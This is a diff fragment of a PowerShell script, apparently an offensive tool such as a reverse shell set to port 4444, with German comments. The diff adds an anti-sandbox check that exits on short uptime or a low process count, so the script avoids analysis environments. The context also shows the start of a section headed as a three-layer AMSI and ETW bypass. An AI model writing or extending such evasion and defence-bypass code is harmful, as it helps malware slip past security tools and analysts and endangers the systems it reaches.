@@ -14,6 +14,14 @@ $PORT        = 4444
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
+# Anti-Sandbox: Frische Uptime oder wenig Prozesse = Analyseumgebung
+try {
+    $bt=(Get-CimInstance Win32_OperatingSystem -EA SilentlyContinue).LastBootUpTime
+    $pc=(Get-Process -EA SilentlyContinue).Count
+    if($bt -and $pc -and (((Get-Date)-$bt).TotalMinutes -lt 3 -or $pc -lt 35)){exit}
+} catch {}
+Start-Sleep -Seconds 3
+
 # AMSI + ETW: 3-Layer-Bypass
 try {
     $n="WR$(Get-Random)"
